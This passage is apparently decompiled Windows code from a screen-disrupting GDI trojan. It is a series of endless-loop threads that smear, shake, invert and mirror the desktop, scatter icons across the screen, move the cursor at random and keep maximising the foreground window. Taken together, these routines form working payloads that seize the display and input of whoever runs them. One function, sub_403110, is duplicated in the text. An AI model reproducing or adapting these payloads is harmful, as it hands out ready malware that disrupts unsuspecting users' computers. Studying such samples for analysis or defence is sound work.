      goto LABEL_19;
    }
  }
  left = 0;
  Rect.left = 0;
  goto LABEL_8;
}

void __stdcall __noreturn sub_402860(LPVOID lpThreadParameter)
{
  HDC DC; // esi
  struct tagCURSORINFO pci; // [esp+10h] [ebp-24h] BYREF
  struct tagPOINT Point; // [esp+24h] [ebp-10h] BYREF

  DC = GetDC(0);
  while ( 1 )
  {
    GetCursorPos(&Point);
    pci.cbSize = 20;
    GetCursorInfo(&pci);
    DrawIcon(DC, Point.x, Point.y, pci.hCursor);
    Sleep(0xAu);
  }
}

void __stdcall __noreturn sub_401E80(LPVOID lpThreadParameter)
{
  HDC DC; // edi
  unsigned __int64 v2; // rax
  int v3; // ebx
  unsigned __int64 v4; // rax
  int v5; // esi
  int v6; // ecx
  HBRUSH v7; // eax
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rax
  int v11; // edi
  int v12; // ebx
  int v13; // ecx
  int v14; // eax
  int v15; // edx
  int v16; // esi
  COLORREF v17; // [esp-4h] [ebp-3Ch]
  int SystemMetrics; // [esp+Ch] [ebp-2Ch]
  HPEN h; // [esp+10h] [ebp-28h]
  int v20; // [esp+14h] [ebp-24h]
  int v21; // [esp+18h] [ebp-20h]
  HDC hdc; // [esp+1Ch] [ebp-1Ch]
  int v23; // [esp+20h] [ebp-18h]
  int v24; // [esp+24h] [ebp-14h]
  HBRUSH SolidBrush; // [esp+28h] [ebp-10h]
  int v26; // [esp+2Ch] [ebp-Ch]
  int v27; // [esp+30h] [ebp-8h]
  int v28; // [esp+34h] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  v24 = GetSystemMetrics(1);
  DC = GetDC(0);
  v2 = __rdtsc();
  hdc = DC;
  v17 = 255;
  v3 = (((((_DWORD)v2 << 13) ^ (unsigned int)v2) << 17) ^ ((_DWORD)v2 << 13) ^ (unsigned int)v2 ^ (unsigned __int64)(32 * (((((_DWORD)v2 << 13) ^ (unsigned int)v2) << 17) ^ ((_DWORD)v2 << 13) ^ (unsigned int)v2)))
     % (unsigned int)SystemMetrics;
  v4 = __rdtsc();
  v28 = v3;
  v5 = (((((_DWORD)v4 << 13) ^ (unsigned int)v4) << 17) ^ ((_DWORD)v4 << 13) ^ (unsigned int)v4 ^ (unsigned __int64)(32 * (((((_DWORD)v4 << 13) ^ (unsigned int)v4) << 17) ^ ((_DWORD)v4 << 13) ^ (unsigned int)v4)))
     % (unsigned int)v24;
  v27 = v5;
  SolidBrush = CreateSolidBrush(v17);
  h = CreatePen(0, 2, 0xFFFFFFu);
  v6 = 0;
  while ( 1 )
  {
    v20 = v6;
    switch ( v6 )
    {
      case 1:
        v7 = CreateSolidBrush(0xA5FFu);
        SolidBrush = v7;
        break;
      case 2:
        v7 = CreateSolidBrush(0xFFFFu);
        SolidBrush = v7;
        break;
      case 3:
        v7 = CreateSolidBrush(0xFF00u);
        SolidBrush = v7;
        break;
      case 4:
        v7 = CreateSolidBrush(0xFFFF00u);
        SolidBrush = v7;
        break;
      case 5:
        v7 = CreateSolidBrush(0xFF0000u);
        SolidBrush = v7;
        break;
      case 6:
        v7 = CreateSolidBrush(0xD30094u);
        SolidBrush = v7;
        break;
      case 7:
        v7 = CreateSolidBrush(0xFF00FFu);
        SolidBrush = v7;
        break;
      case 8:
        v7 = CreateSolidBrush(0xFFu);
        SolidBrush = v7;
        v20 = 0;
        break;
      default:
        v7 = SolidBrush;
        break;
    }
    SelectObject(DC, v7);
    SelectObject(DC, h);
    if ( v3 >= SystemMetrics || v5 >= v24 || v3 <= 0 || v5 <= 0 )
    {
      v8 = __rdtsc();
      v3 = (((((_DWORD)v8 << 13) ^ (unsigned int)v8) << 17) ^ ((_DWORD)v8 << 13) ^ (unsigned int)v8 ^ (unsigned __int64)(32 * (((((_DWORD)v8 << 13) ^ (unsigned int)v8) << 17) ^ ((_DWORD)v8 << 13) ^ (unsigned int)v8)))
         % (unsigned int)SystemMetrics;
      v9 = __rdtsc();
      v28 = v3;
      v5 = (((((_DWORD)v9 << 13) ^ (unsigned int)v9) << 17) ^ ((_DWORD)v9 << 13) ^ (unsigned int)v9 ^ (unsigned __int64)(32 * (((((_DWORD)v9 << 13) ^ (unsigned int)v9) << 17) ^ ((_DWORD)v9 << 13) ^ (unsigned int)v9)))
         % (unsigned int)v24;
      v27 = v5;
    }
    v10 = __rdtsc();
    v11 = v3 - 60;
    v12 = v5 - 60;
    v13 = v10 & 3;
    v14 = v28 + 60;
    v15 = 10;
    v21 = v13;
    v26 = v28 + 60;
    v16 = v5 + 60;
    v23 = 10;
    do
    {
      if ( v13 )
      {
        if ( v13 == 1 )
        {
          Ellipse(hdc, v11, v12, v14, v16);
          v28 += 20;
          v26 += 20;
          v11 += 20;
LABEL_33:
          v27 -= 20;
          v16 -= 20;
          v12 -= 20;
          goto LABEL_34;
        }
        if ( v13 != 2 )
        {
          if ( v13 != 3 )
            goto LABEL_35;
          Ellipse(hdc, v11, v12, v14, v16);
          v28 -= 20;
          v26 -= 20;
          v11 -= 20;
          goto LABEL_33;
        }
        Ellipse(hdc, v11, v12, v14, v16);
        v28 -= 20;
        v11 -= 20;
        v26 -= 20;
        v16 += 20;
        v27 += 20;
        v12 += 20;
      }
      else
      {
        Ellipse(hdc, v11, v12, v14, v16);
        v28 += 20;
        v11 += 20;
        v26 += 20;
        v16 += 20;
        v27 += 20;
        v12 += 20;
      }
LABEL_34:
      Sleep(0x82u);
      v15 = v23;
      v13 = v21;
      v14 = v26;
LABEL_35:
      v23 = --v15;
    }
    while ( v15 );
    v3 = v28;
    v6 = v20 + 1;
    v5 = v27;
    DC = hdc;
  }
}

void __stdcall __noreturn sub_402130(LPVOID lpThreadParameter)
{
  int SystemMetrics; // esi
  HDC DC; // edi
  int v3; // ecx
  unsigned __int64 v4; // rax
  int v5; // eax
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // rt2
  int v8; // esi
  double v9; // xmm0_8
  int v10; // esi
  unsigned __int64 v11; // rax
  double v12; // xmm0_8
  unsigned __int64 v13; // rax
  int v14; // esi
  double v15; // xmm0_8
  unsigned __int64 v16; // rax
  double v17; // xmm0_8
  HICON v18; // [esp-4h] [ebp-2Ch]
  HICON IconW; // [esp-4h] [ebp-2Ch]
  HICON v20; // [esp-4h] [ebp-2Ch]
  HICON v21; // [esp-4h] [ebp-2Ch]
  int v22; // [esp+Ch] [ebp-1Ch]
  int X; // [esp+10h] [ebp-18h]
  int i; // [esp+14h] [ebp-14h]
  int v25; // [esp+14h] [ebp-14h]
  int v26; // [esp+14h] [ebp-14h]
  int v27; // [esp+14h] [ebp-14h]
  double v28; // [esp+18h] [ebp-10h]
  double v29; // [esp+20h] [ebp-8h]

  X = GetSystemMetrics(0);
  SystemMetrics = GetSystemMetrics(1);
  v22 = SystemMetrics;
  DC = GetDC(0);
  v3 = X;
  while ( 1 )
  {
    v4 = __rdtsc();
    v29 = 0.0;
    v28 = 0.0;
    v5 = v4 & 3;
    if ( v5 )
    {
      if ( v5 == 1 )
      {
        v10 = v3;
        v11 = __rdtsc();
        v3 = X;
        v25 = (((((_DWORD)v11 << 13) ^ (unsigned int)v11) << 17) ^ ((_DWORD)v11 << 13) ^ (unsigned int)v11 ^ (unsigned __int64)(32 * (((((_DWORD)v11 << 13) ^ (unsigned int)v11) << 17) ^ ((_DWORD)v11 << 13) ^ (unsigned int)v11)))
            % (unsigned int)v22;
        if ( X > 0 )
        {
          do
          {
            IconW = LoadIconW(0, (LPCWSTR)0x7F03);
            v12 = *(double *)_libm_sse2_cos_precise().m128_u64;
            DrawIcon(DC, v10, (int)(v12 * v29 + (double)v25), IconW);
            v28 = v28 + 0.05;
            v29 = v29 + 0.32;
            Sleep(0xAu);
            v10 -= 3;
          }
          while ( v10 > 0 );
LABEL_2:
          v3 = X;
        }
      }
      else if ( v5 == 2 )
      {
        v13 = __rdtsc();
        v14 = 0;
        v3 = X;
        v26 = (((((_DWORD)v13 << 13) ^ (unsigned int)v13) << 17) ^ ((_DWORD)v13 << 13) ^ (unsigned int)v13 ^ (unsigned __int64)(32 * (((((_DWORD)v13 << 13) ^ (unsigned int)v13) << 17) ^ ((_DWORD)v13 << 13) ^ (unsigned int)v13)))
            % (unsigned int)X;
        if ( v22 > 0 )
        {
          do
          {
            v20 = LoadIconW(0, (LPCWSTR)0x7F04);
            v15 = *(double *)_libm_sse2_cos_precise().m128_u64;
            DrawIcon(DC, (int)(v15 * v29 + (double)v26), v14, v20);
            v28 = v28 + 0.05;
            v29 = v29 + 0.32;
            Sleep(0xAu);
            v14 += 3;
          }
          while ( v14 < v22 );
          goto LABEL_2;
        }
      }
      else
      {
        v16 = __rdtsc();
        v3 = X;
        v27 = (((((_DWORD)v16 << 13) ^ (unsigned int)v16) << 17) ^ ((_DWORD)v16 << 13) ^ (unsigned int)v16 ^ (unsigned __int64)(32 * (((((_DWORD)v16 << 13) ^ (unsigned int)v16) << 17) ^ ((_DWORD)v16 << 13) ^ (unsigned int)v16)))
            % (unsigned int)X;
        if ( v22 > 0 )
        {
          do
          {
            v21 = LoadIconW(0, (LPCWSTR)0x7F02);
            v17 = *(double *)_libm_sse2_cos_precise().m128_u64;
            DrawIcon(DC, (int)(v17 * v29 + (double)v27), SystemMetrics, v21);
            v28 = v28 + 0.05;
            v29 = v29 + 0.32;
            Sleep(0xAu); //Sleep(10);
            SystemMetrics -= 3;
          }
          while ( SystemMetrics > 0 );
          goto LABEL_2;
        }
      }
    }
    else
    {
      v6 = __rdtsc();
      v3 = X;
      v7 = (((((_DWORD)v6 << 13) ^ (unsigned int)v6) << 17) ^ ((_DWORD)v6 << 13) ^ (unsigned int)v6 ^ (unsigned __int64)(32 * (((((_DWORD)v6 << 13) ^ (unsigned int)v6) << 17) ^ ((_DWORD)v6 << 13) ^ (unsigned int)v6)))
         % (unsigned int)SystemMetrics;
      v8 = 0;
      for ( i = v7; v8 < X; v8 += 3 )
      {
        v18 = LoadIconW(0, (LPCWSTR)0x7F01);
        v9 = *(double *)_libm_sse2_cos_precise().m128_u64;
        DrawIcon(DC, v8, (int)(v9 * v29 + (double)i), v18);
        v28 = v28 + 0.05;
        v29 = v29 + 0.32;
        Sleep(0xAu); //Sleep(10);
        v3 = X;
      }
    }
    SystemMetrics = v22;
  }
}

void __stdcall __noreturn sub_402450(LPVOID lpThreadParameter)
{
  int v1; // ebx
  HDC DC; // edi
  int i; // esi
  double v4; // xmm0_8
  int SystemMetrics; // [esp+Ch] [ebp-Ch]
  double v6; // [esp+10h] [ebp-8h]

  SystemMetrics = GetSystemMetrics(0);//x
  v1 = GetSystemMetrics(1);//y
  DC = GetDC(0);
  v6 = 0.0;
  while ( 1 )
  {
    for ( i = 0; i < v1; v6 = v6 + 0.04 )
    {
      v4 = *(double *)_libm_sse2_sin_precise().m128_u64;
      BitBlt(DC, (int)(v4 * 8.0), i, SystemMetrics, 1, DC, 0, i, 0xCC0020u);
      ++i;
    }
    Sleep(0x28u); //Sleep(40);
  }
}

void __stdcall __noreturn sub_4024F0(LPVOID lpThreadParameter)
{
  int SystemMetrics; // edi
  int v2; // ebx
  HDC DC; // esi

  SystemMetrics = GetSystemMetrics(0);
  v2 = GetSystemMetrics(1);
  DC = GetDC(0);
  while ( 1 )
  {
    BitBlt(DC, 10, 10, SystemMetrics, v2, DC, 0, 0, 0xCC0020u);
    Sleep(0x32u);
    BitBlt(DC, -10, 10, SystemMetrics, v2, DC, 0, 0, 0xCC0020u);
    Sleep(0x32u);
    BitBlt(DC, 10, -10, SystemMetrics, v2, DC, 0, 0, 0xCC0020u);
    Sleep(0x32u);
    BitBlt(DC, -10, -10, SystemMetrics, v2, DC, 0, 0, 0xCC0020u);
    Sleep(0x32u);
  }
}

void __stdcall __noreturn sub_402B90(LPVOID lpThreadParameter)
{
  HWND ForegroundWindow; // eax

  while ( 1 )
  {
    ForegroundWindow = GetForegroundWindow();
    ShowWindow(ForegroundWindow, 3);
    Sleep(0x514u);
  }
}

void __stdcall __noreturn sub_402BC0(LPVOID lpThreadParameter)
{
  unsigned __int64 v1; // rax
  signed int v2; // esi
  unsigned int v3; // ebx
  signed int v4; // ebx
  HWND DesktopWindow; // eax
  signed int i; // esi
  HWND v7; // eax
  signed int v8; // [esp+10h] [ebp-38h]
  HDC hdcDest; // [esp+14h] [ebp-34h]
  struct tagRECT Rect; // [esp+1Ch] [ebp-2Ch] BYREF
  POINT Point; // [esp+2Ch] [ebp-1Ch] BYREF
  int v12; // [esp+34h] [ebp-14h]
  int v13; // [esp+38h] [ebp-10h]
  int v14; // [esp+3Ch] [ebp-Ch]
  int v15; // [esp+40h] [ebp-8h]

  hdcDest = GetDC(0);
  while ( 1 )
  {
    do
    {
      v1 = __rdtsc();
      v2 = 0;
      v8 = 0;
      v3 = ((((_DWORD)v1 << 13) ^ (unsigned int)v1) << 17) ^ ((_DWORD)v1 << 13) ^ v1;
      v4 = ((32 * v3) ^ v3) % 0x41 + 60;
    }
    while ( v4 <= 0 );
    do
    {
      DesktopWindow = GetDesktopWindow();
      GetWindowRect(DesktopWindow, &Rect);
      Point.x = Rect.left + v2;
      Point.y = Rect.top - v2;
      v12 = Rect.right + v8;
      v13 = Rect.top + v8;
      v14 = Rect.left - v8;
      v15 = Rect.bottom - v8;
      PlgBlt(hdcDest, &Point, hdcDest, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
      Sleep(0x28u);
      v2 = v8 + 20;
      v8 = v2;
    }
    while ( v2 < v4 );
    for ( i = 0; i < v4; i += 20 )
    {
      v7 = GetDesktopWindow();
      GetWindowRect(v7, &Rect);
      Point.x = Rect.left - i;
      Point.y = i + Rect.top;
      v12 = Rect.right - i;
      v13 = Rect.top - i;
      v14 = i + Rect.left;
      v15 = i + Rect.bottom;
      PlgBlt(hdcDest, &Point, hdcDest, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
      Sleep(0x28u);
    }
  }
}

void __stdcall __noreturn sub_402AF0(LPVOID lpThreadParameter)
{
  unsigned __int64 v1; // rax
  char v2; // si
  unsigned __int64 v3; // rax
  char v4; // di
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // rax
  unsigned int v7; // ebx
  unsigned __int64 v8; // rax
  char v9; // cl
  unsigned __int64 v10; // rax
  int SystemMetrics; // [esp+10h] [ebp-10h]
  int v12; // [esp+14h] [ebp-Ch]
  unsigned int v13; // [esp+18h] [ebp-8h]
  HDC hdc; // [esp+1Ch] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  v12 = GetSystemMetrics(1);
  for ( hdc = GetDC(0);
        ;
        BitBlt(
          hdc,
          v10 & 1,
          v9 & 1,
          (v7 ^ (unsigned __int64)(32 * v7)) % (unsigned int)SystemMetrics,
          (v13 ^ (unsigned __int64)(32 * v13)) % (unsigned int)v12,
          hdc,
          v4 & 1,
          v2 & 1,
          0xCC0020u) )
  {
    v1 = __rdtsc();
    v2 = v1;
    v3 = __rdtsc();
    v4 = v3;
    v5 = __rdtsc();
    v13 = ((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ v5;
    v6 = __rdtsc();
    v7 = ((((_DWORD)v6 << 13) ^ (unsigned int)v6) << 17) ^ ((_DWORD)v6 << 13) ^ v6;
    v8 = __rdtsc();
    v9 = v8;
    v10 = __rdtsc();
  }
}

void __stdcall __noreturn sub_402590(LPVOID lpThreadParameter)
{
  HDC DC; // ebx
  unsigned __int64 v2; // rax
  char v3; // cl
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rax
  char v6; // di
  unsigned __int64 v7; // rax
  int v8; // [esp-18h] [ebp-2Ch]
  int v9; // [esp-14h] [ebp-28h]
  HDC v10; // [esp-10h] [ebp-24h]
  int v11; // [esp-Ch] [ebp-20h]
  int v12; // [esp-8h] [ebp-1Ch]
  DWORD v13; // [esp-4h] [ebp-18h]
  int SystemMetrics; // [esp+Ch] [ebp-8h]
  int cy; // [esp+10h] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  cy = GetSystemMetrics(1);
  DC = GetDC(0);
  while ( 1 )
  {
    v13 = 8913094;
    v2 = __rdtsc();
    v3 = v2;
    v4 = __rdtsc();
    v12 = v3 & 1;
    v11 = v4 & 1;
    v10 = DC;
    v9 = cy;
    v5 = __rdtsc();
    v8 = SystemMetrics;
    v6 = v5;
    v7 = __rdtsc();
    BitBlt(DC, v7 & 1, v6 & 1, v8, v9, v10, v11, v12, v13);
    Sleep(0x82u);
  }
}

void __stdcall __noreturn sub_4034C0(LPVOID lpThreadParameter)
{
  unsigned __int64 v1; // rax
  unsigned int v2; // ebx
  unsigned __int64 v3; // rax
  unsigned int v4; // edi
  unsigned __int64 v5; // rax
  HBRUSH SolidBrush; // eax
  int v7; // eax
  int v8; // esi
  int v9; // ebx
  int v10; // [esp+Ch] [ebp-10h]
  int SystemMetrics; // [esp+10h] [ebp-Ch]
  HDC hdc; // [esp+14h] [ebp-8h]
  int bottom; // [esp+18h] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  v10 = GetSystemMetrics(1);
  hdc = GetDC(0);
  bottom = 0;
  while ( 1 )
  {
    v1 = __rdtsc();
    LODWORD(v1) = ((((_DWORD)v1 << 13) ^ (unsigned int)v1) << 17) ^ ((_DWORD)v1 << 13) ^ v1;
    v2 = v1 ^ (32 * v1);
    v3 = __rdtsc();
    LODWORD(v3) = ((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ v3;
    v4 = v3 ^ (32 * v3);
    v5 = __rdtsc();
    LODWORD(v5) = ((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ v5;
    SolidBrush = CreateSolidBrush((unsigned __int8)(v2 + v2 / 0xFF) | (unsigned __int16)(((_WORD)v4
                                                                                        + (unsigned __int16)(v4 / 0xFF)) << 8) | ((((unsigned int)v5 ^ (32 * (_DWORD)v5)) + ((unsigned int)v5 ^ (32 * (_DWORD)v5)) / 0xFF) << 16) & 0xFF0000);
    SelectObject(hdc, SolidBrush);
    v7 = 0;
    if ( SystemMetrics > 0 )
    {
      do
      {
        v8 = v7 + 100;
        Rectangle(hdc, v7, bottom + 100, v7 + 100, bottom);
        Sleep(0xAu);
        v7 = v8;
      }
      while ( v8 < SystemMetrics );
    }
    v9 = bottom + 100;
    if ( bottom + 100 >= v10 )
      v9 = 0;
    bottom = v9;
    Sleep(0x1Eu);
  }
}

void __stdcall __noreturn sub_402D40(LPVOID lpThreadParameter)
{
  unsigned __int64 v1; // rax
  unsigned int v2; // ebx
  unsigned __int64 v3; // rax
  unsigned int v4; // edi
  unsigned __int64 v5; // rax
  HBRUSH SolidBrush; // eax
  unsigned __int64 v7; // rax
  unsigned int v8; // esi
  int w; // [esp+Ch] [ebp-Ch]
  int h; // [esp+10h] [ebp-8h]
  HDC hdc; // [esp+14h] [ebp-4h]

  w = GetSystemMetrics(0);
  h = GetSystemMetrics(1);
  hdc = GetDC(0);
  while ( 1 )
  {
    v1 = __rdtsc();
    LODWORD(v1) = ((((_DWORD)v1 << 13) ^ (unsigned int)v1) << 17) ^ ((_DWORD)v1 << 13) ^ v1;
    v2 = v1 ^ (32 * v1);
    v3 = __rdtsc();
    LODWORD(v3) = ((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ v3;
    v4 = v3 ^ (32 * v3);
    v5 = __rdtsc();
    LODWORD(v5) = ((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ v5;
    SolidBrush = CreateSolidBrush((unsigned __int8)(v2 + v2 / 0xFF) | (unsigned __int16)(((_WORD)v4
                                                                                        + (unsigned __int16)(v4 / 0xFF)) << 8) | ((((unsigned int)v5 ^ (32 * (_DWORD)v5)) + ((unsigned int)v5 ^ (32 * (_DWORD)v5)) / 0xFF) << 16) & 0xFF0000);
    SelectObject(hdc, SolidBrush);
    PatBlt(hdc, 0, 0, w, h, 0x5A0049u);
    v7 = __rdtsc();
    v8 = ((((_DWORD)v7 << 13) ^ (unsigned int)v7) << 17) ^ ((_DWORD)v7 << 13) ^ v7;
    Sleep(((32 * v8) ^ v8) % 0xC8 + 130);
  }
}

void __stdcall __noreturn sub_402E60(LPVOID lpThreadParameter)
{
  int SystemMetrics; // ebx
  unsigned __int64 v2; // rax
  unsigned int v3; // edi
  unsigned __int64 v4; // rax
  unsigned int v5; // esi
  unsigned __int64 v6; // rax
  unsigned int v7; // esi
  int v8; // [esp+Ch] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  v8 = GetSystemMetrics(1);
  while ( 1 )
  {
    v2 = __rdtsc();
    v3 = ((((_DWORD)v2 << 13) ^ (unsigned int)v2) << 17) ^ ((_DWORD)v2 << 13) ^ v2;
    v4 = __rdtsc();
    v5 = ((((_DWORD)v4 << 13) ^ (unsigned int)v4) << 17) ^ ((_DWORD)v4 << 13) ^ v4;
    SetCursorPos(
      (v5 ^ (unsigned __int64)(32 * v5)) % (unsigned int)SystemMetrics,
      (v3 ^ (unsigned __int64)(32 * v3)) % (unsigned int)v8);
    v6 = __rdtsc();
    v7 = ((((_DWORD)v6 << 13) ^ (unsigned int)v6) << 17) ^ ((_DWORD)v6 << 13) ^ v6;
    Sleep(((32 * v7) ^ v7) % 0x320 + 300);
  }
}

void __stdcall __noreturn sub_4030A0(LPVOID lpThreadParameter)
{
  int SystemMetrics; // edi
  int v2; // esi
  HDC DC; // ebx

  SystemMetrics = GetSystemMetrics(0);
  v2 = GetSystemMetrics(1);
  DC = GetDC(0);
  while ( 1 )
  {
    StretchBlt(DC, 0, 0, SystemMetrics, v2, DC, SystemMetrics, 0, -SystemMetrics, v2, 0xCC0020u);
    Sleep(0x64u);
    StretchBlt(DC, 0, 0, SystemMetrics, v2, DC, 0, v2, SystemMetrics, -v2, 0xCC0020u);
    Sleep(0x64u);
  }
}

void __stdcall __noreturn sub_402F00(LPVOID lpThreadParameter)
{
  int v1; // esi
  HDC DC; // ebx
  unsigned __int64 v3; // rax
  int v4; // edi
  unsigned __int64 v5; // rax
  unsigned int v6; // esi
  int v7; // esi
  unsigned __int64 v8; // rax
  int v9; // [esp+Ch] [ebp-Ch]
  int SystemMetrics; // [esp+10h] [ebp-8h]
  unsigned int cy; // [esp+14h] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  v1 = GetSystemMetrics(1);
  v9 = v1;
  DC = GetDC(0);
  while ( 1 )
  {
    v3 = __rdtsc();
    v4 = (((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ (unsigned int)v3 ^ (unsigned __int64)(32 * (((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ (unsigned int)v3)))
       % (unsigned int)v1;
    v5 = __rdtsc();
    v6 = ((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ v5;
    cy = ((32 * v6) ^ v6) % 0x50 + 50;
    v7 = 0;
    v8 = __rdtsc();
    if ( (v8 & 1) != 0 )
    {
      do
        BitBlt(DC, v7--, v4, SystemMetrics, cy, DC, 0, v4, 0xCC0020u);
      while ( v7 > -5 );
      v1 = v9;
    }
    else
    {
      do
        BitBlt(DC, v7++, v4, SystemMetrics, cy, DC, 0, v4, 0xCC0020u);
      while ( v7 < 5 );
      v1 = v9;
    }
  }
}

void __stdcall __noreturn sub_402FF0(LPVOID lpThreadParameter)
{
  int SystemMetrics; // ebx
  HDC DC; // edi
  unsigned __int64 v3; // rax
  DWORD v4; // esi
  int cy; // [esp+Ch] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  cy = GetSystemMetrics(1);
  DC = GetDC(0);
  while ( 1 )
  {
    v3 = __rdtsc();
    v4 = 10066329;
    if ( (v3 & 1) != 0 )
      v4 = 6710886;
    BitBlt(DC, 1, 1, SystemMetrics, cy, DC, 0, 0, v4);
    Sleep(0x28u);
    BitBlt(DC, -1, 1, SystemMetrics, cy, DC, 0, 0, v4);
    Sleep(0x28u);
    BitBlt(DC, 1, -1, SystemMetrics, cy, DC, 0, 0, v4);
    Sleep(0x28u);
    BitBlt(DC, -1, -1, SystemMetrics, cy, DC, 0, 0, v4);
    Sleep(0x28u);
  }
}

void __stdcall __noreturn sub_403110(LPVOID lpThreadParameter)
{
  int SystemMetrics; // ebx
  HDC DC; // edi
  unsigned __int64 v3; // rax
  int v4; // esi
  unsigned __int64 v5; // rax
  int v6; // ebx
  unsigned __int64 v7; // rax
  unsigned int v8; // ecx
  unsigned __int64 v9; // rax
  int v10; // ecx
  int v11; // ebx
  unsigned int v12; // kr00_4
  int v13; // ecx
  HRGN EllipticRgn; // eax
  bool v15; // zf
  int v16; // ebx
  unsigned int v17; // kr04_4
  int v18; // ecx
  HRGN RectRgn; // eax
  unsigned int v20; // [esp+Ch] [ebp-10h]
  unsigned int v21; // [esp+Ch] [ebp-10h]
  int v22; // [esp+10h] [ebp-Ch]
  int cy; // [esp+14h] [ebp-8h]
  int v24; // [esp+18h] [ebp-4h]
  int v25; // [esp+18h] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  v22 = SystemMetrics;
  cy = GetSystemMetrics(1);
  DC = GetDC(0);
  while ( 1 )
  {
    v3 = __rdtsc();
    v4 = (((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ (unsigned int)v3 ^ (unsigned __int64)(32 * (((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ (unsigned int)v3)))
       % (unsigned int)SystemMetrics;
    v5 = __rdtsc();
    v6 = (((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ (unsigned int)v5 ^ (unsigned __int64)(32 * (((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ (unsigned int)v5)))
       % (unsigned int)cy;
    v7 = __rdtsc();
    HIDWORD(v7) = ((((_DWORD)v7 << 13) ^ (unsigned int)v7) << 17) ^ ((_DWORD)v7 << 13) ^ v7;
    v8 = ((unsigned int)(32 * HIDWORD(v7)) ^ HIDWORD(v7)) % 0x258;
    v9 = __rdtsc();
    v10 = v8 + 500;
    if ( (v9 & 1) != 0 )
    {
      if ( v10 > 0 )
      {
        v25 = v4;
        v16 = v6 - v4;
        v17 = v10 - 1;
        v18 = v4;
        v21 = v17 / 0x1E + 1;
        do
        {
          RectRgn = CreateRectRgn(v18, v18 + v16, v4, v4 + v16);
          SelectClipRgn(DC, RectRgn);
          BitBlt(DC, 0, 0, v22, cy, DC, 0, 0, 0x330008u);
          Sleep(1u);
          v4 += 30;
          v18 = v25 - 30;
          v15 = v21-- == 1;
          v25 -= 30;
        }
        while ( !v15 );
      }
    }
    else if ( v10 > 0 )
    {
      v24 = v4;
      v11 = v6 - v4;
      v12 = v10 - 1;
      v13 = v4;
      v20 = v12 / 0x1E + 1;
      do
      {
        EllipticRgn = CreateEllipticRgn(v13, v11 + v13, v4, v11 + v4);
        SelectClipRgn(DC, EllipticRgn);
        BitBlt(DC, 0, 0, v22, cy, DC, 0, 0, 0x330008u);
        Sleep(1u);
        v4 += 30;
        v13 = v24 - 30;
        v15 = v20-- == 1;
        v24 -= 30;
      }
      while ( !v15 );
    }
    Sleep(1u);
    SystemMetrics = v22;
  }
}

void __stdcall __noreturn sub_403110(LPVOID lpThreadParameter)
{
  int SystemMetrics; // ebx
  HDC DC; // edi
  unsigned __int64 v3; // rax
  int v4; // esi
  unsigned __int64 v5; // rax
  int v6; // ebx
  unsigned __int64 v7; // rax
  unsigned int v8; // ecx
  unsigned __int64 v9; // rax
  int v10; // ecx
  int v11; // ebx
  unsigned int v12; // kr00_4
  int v13; // ecx
  HRGN EllipticRgn; // eax
  bool v15; // zf
  int v16; // ebx
  unsigned int v17; // kr04_4
  int v18; // ecx
  HRGN RectRgn; // eax
  unsigned int v20; // [esp+Ch] [ebp-10h]
  unsigned int v21; // [esp+Ch] [ebp-10h]
  int v22; // [esp+10h] [ebp-Ch]
  int cy; // [esp+14h] [ebp-8h]
  int v24; // [esp+18h] [ebp-4h]
  int v25; // [esp+18h] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  v22 = SystemMetrics;
  cy = GetSystemMetrics(1);
  DC = GetDC(0);
  while ( 1 )
  {
    v3 = __rdtsc();
    v4 = (((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ (unsigned int)v3 ^ (unsigned __int64)(32 * (((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ (unsigned int)v3)))
       % (unsigned int)SystemMetrics;
    v5 = __rdtsc();
    v6 = (((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ (unsigned int)v5 ^ (unsigned __int64)(32 * (((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ (unsigned int)v5)))
       % (unsigned int)cy;
    v7 = __rdtsc();
    HIDWORD(v7) = ((((_DWORD)v7 << 13) ^ (unsigned int)v7) << 17) ^ ((_DWORD)v7 << 13) ^ v7;
    v8 = ((unsigned int)(32 * HIDWORD(v7)) ^ HIDWORD(v7)) % 0x258;
    v9 = __rdtsc();
    v10 = v8 + 500;
    if ( (v9 & 1) != 0 )
    {
      if ( v10 > 0 )
      {
        v25 = v4;
        v16 = v6 - v4;
        v17 = v10 - 1;
        v18 = v4;
